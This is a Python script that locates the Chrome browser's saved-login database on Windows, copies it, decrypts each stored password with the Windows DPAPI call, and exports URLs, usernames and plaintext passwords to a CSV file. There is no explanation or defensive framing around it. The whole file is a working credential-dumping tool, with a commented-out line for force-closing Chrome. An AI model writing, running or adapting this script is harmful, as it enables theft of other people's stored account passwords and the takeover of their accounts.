import os
import sqlite3
import win32crypt
import sys
from shutil import copyfile
import csv


 #os.system("taskkill /im Chrome.exe /f")

def csv_writer(data, path):
    if len(data)>1:
        with open(path, "w") as csv_file:
            writer = csv.writer(csv_file, delimiter=',')
            for line in data:
                writer.writerow(line)
rows = []
try:
    path = sys.argv[1]
except IndexError:
    for w in os.walk(os.getenv('LOCALAPPDATA')):
        if 'Chrome' in w[1]:
            path = str(w[0]) + "\\Chrome\\User Data\\Default\\Login Data"

# Connect to the Database
try:
    print('[+] Opening ' + path)
    copyfile(path,  "Login_data")
    conn = sqlite3.connect("Login_data")
    cursor = conn.cursor()
except Exception as e:
    print('[-] %s' % (e))
    sys.exit(1)

# Get the results
try:
    cursor.execute('SELECT action_url, username_value, password_value FROM logins')
except Exception as e:
    print('[-] %s' % (e))
    sys.exit(1)
i = 0
data = cursor.fetchall()
header = ['URL', 'Username', 'Password'];
if len(data) > 0:
    for result in data:
        # Decrypt the Password
        try:
            password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
        except Exception as e:
            print('[-] %s' % (e))
            pass
        if password:
           # print('''[+] URL: %s  Username: %s Password: %s''' % (result[0], result[1], password))
            url = result[0];
            username = result[1]
            pwd = password.decode()
            rows.append(["URL: "  + url ," Username: " + username , " Password: " + pwd + ";"])
            i+=1

else:
    print('[-] No results returned from query')
    sys.exit(0)

conn.close()
csv_writer(rows, "passwords.csv")
print("Exported "+ str(i) + " rows")
os.remove("Login_data")
